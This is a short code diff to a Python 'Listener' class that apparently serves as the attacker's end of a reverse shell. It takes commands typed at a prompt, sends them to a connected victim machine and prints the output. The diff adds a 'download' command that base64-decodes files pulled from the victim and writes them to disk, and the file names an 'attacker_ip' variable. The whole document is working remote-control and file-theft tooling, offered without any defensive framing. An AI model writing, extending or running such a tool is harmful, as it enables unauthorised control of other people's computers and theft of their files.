@@ -1,5 +1,6 @@
 import json
 import socket 
+from base64 import b64decode
 from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 
 class Listener:
@@ -30,11 +31,21 @@ class Listener:
     def execute_remote_command(self, command):
         self.send(command)
         return self.receive()
+    
+    def write_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(b64decode(content))
+            return '[+] Download successful.'
 
     def run(self):
         while True:
             command = input('>> ')
+            command = command.split(' ')
             result = self.execute_remote_command(command)
+
+            if command[0] == 'download':
+                self.write_file(command[1], result)
+
             print(result)
 
 attacker_ip = "192.168.106.129"
